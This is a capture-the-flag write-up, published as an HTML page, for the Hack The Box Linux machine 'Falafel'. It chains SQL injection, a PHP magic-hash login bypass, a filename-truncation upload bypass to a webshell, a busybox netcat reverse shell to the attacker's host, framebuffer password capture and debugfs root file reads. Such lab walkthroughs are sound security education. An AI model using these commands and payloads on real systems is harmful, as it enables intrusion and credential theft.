@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Falafel &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge htb">HTB</span>
+      <span class="badge os">Linux</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Falafel</h1>
+    <div class="meta">Target: <code>10.10.15.99</code></div>
+    <div class="tags"><span class="tag">Linux</span><span class="tag">PHP</span><span class="tag">SQLi</span><span class="tag">SQLMap</span><span class="tag">PHPTypeJuggling</span><span class="tag">UploadBypass</span><span class="tag">FilenameTruncation</span><span class="tag">busybox</span><span class="tag">credentialhunting</span><span class="tag">VideoGroup</span><span class="tag">framebuffer</span><span class="tag">debugfs</span><span class="tag">DiskGroup</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#directory-enumeration">Directory Enumeration</a><a class="lvl3" href="#username-enumeration-via-error-message-differences">Username Enumeration via Error Message Differences</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#sql-injection-password-hashes">SQL Injection → Password Hashes</a><a class="lvl3" href="#php-type-juggling-to-log-in-as-admin">PHP Type Juggling to Log In as Admin</a><a class="lvl3" href="#image-upload-filename-truncation-bypass">Image Upload, Filename Truncation Bypass</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#www-data-moshe-credential-reuse">www-data → moshe (Credential Reuse)</a><a class="lvl3" href="#moshe-yossi-framebuffer-screenshot">moshe → yossi (Framebuffer Screenshot)</a><a class="lvl3" href="#yossi-root-disk-group-debugfs">yossi → root (disk group / debugfs)</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Falafel is a hard Linux box with a layered web attack chain followed by a creative privilege escalation route. SQL injection dumps password hashes; a PHP type-juggling bug bypasses the admin login; a filename-length truncation trick converts a <code>.php.png</code> upload into a live PHP webshell. Lateral movement relies on credential reuse from the web app's database config. Root comes from membership in the <code>disk</code> group, which grants raw read access to the block device via <code>debugfs</code>.</p>
+<h2 id="recon">Recon</h2>
+<h3 id="directory-enumeration">Directory Enumeration</h3>
+<p>The site runs PHP on Apache 2.4.18. Two GoBuster passes were needed: the first with the <code>.php</code> extension, the second with <code>.txt</code> (hinted by robots.txt disallowing all <code>.txt</code>):</p>
+<pre><code class="language-sh">gobuster dir -u http://10.129.229.139/ -w /path/to/big.txt -x php
+/login.php   (Status: 200)
+/upload.php  (Status: 302)
+/uploads     (Status: 301)
+/connection.php  (Status: 200)
+</code></pre>
+<pre><code class="language-sh">gobuster dir -u http://10.129.229.139/ -w /path/to/directory-list-2.3-medium.txt -x txt
+/cyberlaw.txt  (Status: 200)
+</code></pre>
+<p><code>cyberlaw.txt</code> was an email from the site admin to lawyers and devs describing how a user named <code>chris</code> had bypassed the login and used the image upload for full site control:</p>
+<pre><code>From: admin@falafel.htb
+A user named &quot;chris&quot; has informed me that he could log into MY account without knowing
+the password, then take FULL CONTROL of the website using the image upload feature.
+</code></pre>
+<p>Two valid usernames identified: <code>admin</code>, <code>chris</code>.</p>
+<h3 id="username-enumeration-via-error-message-differences">Username Enumeration via Error Message Differences</h3>
+<p>Invalid usernames returned "try again...", while valid ones returned "Wrong Identification: \&lt;username&gt;". Wfuzz confirmed both accounts:</p>
+<pre><code class="language-sh">wfuzz -c -w /usr/share/seclists/Usernames/Names/names.txt \
+  -d &quot;username=FUZZ&amp;password=‹redacted›&quot; -u http://10.129.229.139/login.php --hh 7074
+000000086: admin
+000001886: chris
+</code></pre>
+<h2 id="foothold">Foothold</h2>
+<h3 id="sql-injection-password-hashes">SQL Injection → Password Hashes</h3>
+<p>Saving the login POST request and running SQLMap with time-based blind payload detection:</p>
+<pre><code class="language-sh">sqlmap -r request.txt --level 5 --risk 3 --batch --string &quot;Wrong identification&quot; --dump
+</code></pre>
+<p>Output from <code>falafel.users</code>:</p>
+<pre><code>admin  | ‹redacted›
+chris  | ‹redacted›  (juggling)
+</code></pre>
+<p>SQLMap cracked chris's hash inline. The admin hash remained unsolved by the default dictionary, but its value is the key.</p>
+<h3 id="php-type-juggling-to-log-in-as-admin">PHP Type Juggling to Log In as Admin</h3>
+<p>Chris's password <code>juggling</code> and the hash value <code>‹redacted›</code> are both hints. PHP's loose comparison (<code>==</code>) compares values after type coercion. If both sides look like scientific notation (<code>0e...</code> followed by digits), PHP treats them as <code>0 * 10^n = 0</code> on both sides, so they compare equal regardless of the actual string.</p>
+<blockquote>
+<p><strong>Magic hash attack:</strong> <code>‹redacted›</code> starts with <code>0e</code> and is all digits, so PHP evaluates it as <code>0.0</code>. If we supply a password whose MD5 hash also starts with <code>0e</code> and is all digits, PHP's <code>md5($input) == $stored_hash</code> evaluates as <code>0.0 == 0.0</code>, which is <code>true</code>. The magic number <code>240610708</code> has this property.</p>
+</blockquote>
+<p>Logging in as <code>admin</code> with the password <code>240610708</code> succeeded.</p>
+<h3 id="image-upload-filename-truncation-bypass">Image Upload, Filename Truncation Bypass</h3>
+<p>The admin panel includes an upload feature that fetches an image from a URL. Extension filtering blocked <code>.php</code> uploads. Probing with varied input showed the app uses <code>wget</code> to fetch the URL, and the filename is derived from the URL path.</p>
+<p>The hint was the admin profile motto "Know your limits." Supplying a URL with a very long filename triggered a different error message. Experimenting to find the exact character limit:</p>
+<pre><code class="language-python">URL=$(python -c 'print &quot;http://10.10.15.99:8081/&quot; + &quot;A&quot;*232 + &quot;.php.png&quot;')
+</code></pre>
+<p>At 240 total characters the filename is truncated:</p>
+<pre><code>The name is too long, 240 chars total. Trying to shorten...
+New name is AAAA...AAAA.php
+</code></pre>
+<blockquote>
+<p><strong>Why truncation beats the filter:</strong> the extension check runs before <code>wget</code> fetches the file. By naming the file <code>&lt;232 A's&gt;.php.png</code>, the check sees <code>.png</code> and passes. Then <code>wget</code> saves it, but the filesystem path is limited to 255 characters; with the upload-directory prefix eating some characters, the <code>.png</code> suffix is silently dropped, leaving a <code>.php</code> file on disk.</p>
+</blockquote>
+<p>PoC after upload:</p>
+<pre><code class="language-sh">curl &quot;http://10.129.96.7/uploads/&lt;timestamp&gt;_&lt;hash&gt;/AAA...AAA.php?cmd=id&quot;
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre>
+<p>Full shell using busybox nc (no special characters):</p>
+<pre><code class="language-sh">busybox nc 10.10.14.167 53 -e /bin/bash
+</code></pre>
+<pre><code class="language-sh">rlwrap nc -lvnp 53
+connect to [10.10.14.167] from (UNKNOWN) [10.129.96.7] 37154
+whoami
+www-data
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="www-data-moshe-credential-reuse">www-data → moshe (Credential Reuse)</h3>
+<p><code>connection.php</code> in the web root held the database credentials:</p>
+<pre><code class="language-php">define('DB_USERNAME', 'moshe');
+define('DB_PASSWORD', '‹redacted›');
+</code></pre>
+<p>These credentials worked for local login:</p>
+<pre><code class="language-sh">su moshe
+# Password: ‹redacted›
+whoami
+moshe
+</code></pre>
+<h3 id="moshe-yossi-framebuffer-screenshot">moshe → yossi (Framebuffer Screenshot)</h3>
+<p><code>moshe</code> is in the <code>video</code> group. Running a group-file sweep found <code>/dev/fb0</code> (the framebuffer device) readable:</p>
+<pre><code class="language-sh">cat /dev/fb0 &gt; /dev/shm/.z/screenshot.raw
+cat /sys/class/graphics/fb0/virtual_size
+1176,885
+</code></pre>
+<blockquote>
+<p><strong>The framebuffer trick:</strong> <code>/dev/fb0</code> exposes the raw pixel data of whatever is currently displayed on the physical console. Members of the <code>video</code> group can read it. <code>yossi</code> was logged in on <code>tty1</code>, so the framebuffer contained their active session. Copying it as a raw image and opening it in GIMP (File &gt; Open As &gt; Raw Image Data, <code>RGB565</code>, 1176x885) rendered the screen content, including a visible password.</p>
+</blockquote>
+<p>The framebuffer raw file was transferred back to Kali via <code>scp</code> and opened in GIMP as RGB565. The rendered screenshot showed <code>yossi</code>'s password:</p>
+<pre><code>yossi:‹redacted›
+</code></pre>
+<p>SSH'd in as <code>yossi</code>:</p>
+<pre><code class="language-sh">ssh yossi@10.129.96.7
+</code></pre>
+<h3 id="yossi-root-disk-group-debugfs">yossi → root (disk group / debugfs)</h3>
+<p><code>yossi</code> is in the <code>disk</code> group. Identifying the root partition:</p>
+<pre><code class="language-sh">blkid
+/dev/sda1: UUID=&quot;ccba94d2...&quot; TYPE=&quot;ext4&quot;
+/dev/sda2: UUID=&quot;...&quot; TYPE=&quot;swap&quot;
+</code></pre>
+<blockquote>
+<p><strong>disk group = raw filesystem access:</strong> members of <code>disk</code> can read raw block devices. <code>debugfs</code> is a filesystem debugger that can open a block device directly and navigate it like a mounted filesystem, bypassing all permission checks at the OS level. Any file on the partition, including <code>/root/root.txt</code> or <code>/etc/shadow</code>, is readable.</p>
+</blockquote>
+<pre><code class="language-sh">debugfs /dev/sda1
+debugfs:  cat /root/root.txt
+‹redacted›
+</code></pre>
+<h2 id="root">Root</h2>
+<p>Box rooted via <code>debugfs</code>.</p>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>PHP type juggling is a real login bypass.</strong> Any hash starting <code>0e</code> followed by digits evaluates to zero under loose comparison; the magic number <code>240610708</code> is the canonical exploit value.</li>
+<li><strong>Filename length limits can truncate extension filtering.</strong> Build long filenames that push the dangerous extension past the truncation point and the safety check sees only the benign suffix.</li>
+<li><strong>The <code>video</code> group can read the framebuffer</strong> (<code>/dev/fb0</code>) and expose whatever is on the physical console, including plaintext passwords typed in other sessions.</li>
+<li><strong>The <code>disk</code> group effectively grants root-equivalent read access.</strong> <code>debugfs</code> on a raw block device bypasses all Linux file permissions.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
